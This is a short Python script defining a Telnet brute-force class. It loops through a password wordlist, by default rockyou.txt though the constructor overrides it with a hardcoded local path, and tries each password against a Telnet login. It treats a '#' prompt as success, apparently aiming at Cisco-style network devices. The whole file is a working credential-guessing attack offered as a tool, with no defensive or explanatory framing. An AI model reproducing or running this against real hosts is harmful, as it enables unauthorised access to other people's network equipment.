from telnetlib import Telnet

class Telnet_Attacks:
    def __init__(self,ip_or_domain,user_to_connect,wordlist = "/usr/share/wordlists/rockyou.txt",timeout = 1,port = 23):
        self.ip_or_domain = ip_or_domain
        self.user_to_connect = user_to_connect
        self.port = port
        self.wordlist = r'C:/Users/cagan/Desktop/ciscofucker/wordlist.txt'
        self.timeout = timeout
        
    def Telnet_Bruteforce(self):
        
        # invalid_list = 
        
        wordlist_file = open(self.wordlist,"r")
        lines = wordlist_file.readlines()
        for line in lines:
            word = line.strip('\n')
            try:
                client = Telnet(host=self.ip_or_domain,timeout=self.timeout,port=self.port)

                print(f"Trying Current Password: {word}",flush=True)
                client.read_until(b': ',timeout=self.timeout)
                client.write(self.user_to_connect.encode("ascii")+b"\n")
                client.read_until(b": ",timeout=self.timeout)
                client.write(word.encode("ascii")+b"\n")
                result = client.read_some()

                if "#" in str(result):
                    print(f"Found The Password: {word}")  
                    break   
                client.close()          
            except:
                continue
        
